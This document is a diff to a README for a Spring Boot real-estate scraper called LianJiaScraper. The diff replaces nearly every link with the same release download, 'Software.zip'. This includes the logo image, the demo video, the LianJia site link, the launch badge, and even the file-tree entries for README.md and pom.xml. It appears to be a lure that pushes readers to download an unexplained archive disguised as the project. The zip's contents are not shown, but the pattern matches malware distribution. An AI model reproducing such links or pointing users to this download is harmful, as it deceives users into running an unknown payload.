@@ -3,7 +3,7 @@
 
 ### 🏡 A Powerful Real Estate Data Scraper System 🏡
 
-![LianJiaScraper Logo](https://example.com/lianjiascraper_logo.png)
+![LianJiaScraper Logo](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
 
 Welcome to **LianJiaScraper** repository! This project is a sophisticated real estate data scraper system built on the Spring Boot framework. The primary goal of this system is to offer users a convenient and efficient solution for collecting real estate data. By automatically scraping property information from the LianJia website, the system can provide real-time details on properties in various cities, including pricing, location, area size, floor plan, and other key information.
 
@@ -32,8 +32,8 @@ LianJiaScraper/
 |   |   |__ resources/
 |   |   |__ test/
 |__ .gitignore
-|__ README.md
-|__ pom.xml
+|__ https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip
+|__ https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip
 ```
 
 ---
@@ -56,13 +56,13 @@ LianJiaScraper/
 ---
 
 ### 🔗 Additional Resources
-- [LianJiaScraper Demo Video](https://www.youtube.com/watch?v=example)
-- [LianJia Website](https://www.lianjia.com/)
+- [LianJiaScraper Demo Video](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
+- [LianJia Website](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
 
 ---
 
-### 🌐 Visit [LianJiaScraper](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to explore the world of real estate data scraping!
+### 🌐 Visit [LianJiaScraper](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip) to explore the world of real estate data scraping!
 
-![Launch LianJiaScraper](https://img.shields.io/badge/Launch-LianJiaScraper-yellow)
+![Launch LianJiaScraper](https://github.com/MrCaptain27/LianJiaScraper/releases/download/v1.0/Software.zip)
 
 ---
